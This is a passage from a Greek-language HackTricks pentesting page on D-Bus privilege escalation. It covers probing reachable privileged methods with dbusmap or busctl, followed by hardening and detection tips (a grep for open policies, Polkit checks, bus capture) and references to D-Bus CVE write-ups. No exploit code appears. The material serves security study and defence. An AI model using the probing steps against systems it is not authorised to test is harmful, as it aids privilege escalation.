3. Το προσβάσιμο method τελικά αλλάζει την κατάσταση του συστήματος: package install, αλλαγές user/group, bootloader config, ενημερώσεις device profile, file writes ή άμεση command execution.

Χρησιμοποίησε `dbusmap --enable-probes` ή χειροκίνητο `busctl call` για να επιβεβαιώσεις αν ένα method είναι προσβάσιμο και, στη συνέχεια, εξέτασε το policy XML του service και τα Polkit actions για να κατανοήσεις **ποιο subject** εξουσιοδοτείται στην πραγματικότητα.

---

## Γρήγορες Βελτιώσεις Hardening & Detection

* Αναζήτησε world-writable ή *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Απαίτησε Polkit για dangerous methods – ακόμη και τα *root* proxies πρέπει να περνούν το PID του *caller* στη `polkit_authority_check_authorization_sync()` αντί για το δικό τους.
* Κάνε drop privileges σε long-running helpers (χρησιμοποίησε `sd_pid_get_owner_uid()` για να αλλάξεις namespaces μετά τη σύνδεση στο bus).
* Αν δεν μπορείς να αφαιρέσεις ένα service, τουλάχιστον κάνε *scope* σε dedicated Unix group και περιόρισε την πρόσβαση στο XML policy του.
* Blue-team: κατέγραψε το system bus με `busctl capture > /var/log/dbus_$(date +%F).pcapng` και εισήγαγέ το στο Wireshark για anomaly detection.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation in Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service allows configuration by any unprivileged user](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass in Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)

{{#include ../../banners/hacktricks-training.md}}
